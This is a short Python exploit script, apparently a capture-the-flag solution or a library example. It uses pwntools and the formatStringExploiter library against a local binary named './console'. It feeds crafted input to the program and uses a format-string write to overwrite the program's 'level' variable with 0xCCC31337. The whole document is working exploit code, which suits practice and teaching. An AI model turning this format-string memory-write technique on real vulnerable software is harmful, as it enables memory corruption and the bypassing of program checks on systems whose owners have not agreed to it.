#!/usr/bin/env python

from formatStringExploiter.FormatString import FormatString
from pwn import *

def exec_fmt(s,echo=True):
    p = process("./console",buffer_fill_size=0xffff)
    p.sendline(s)
    p.recvuntil("Hello, ",drop=True)
    out = p.recvall()
    if echo:
        print(out)
    p.close()
    return out
    
elf = ELF("./console")

fmtStr = FormatString(exec_fmt,elf=elf)

fmtStr.write_d(elf.symbols['level'],0xCCC31337)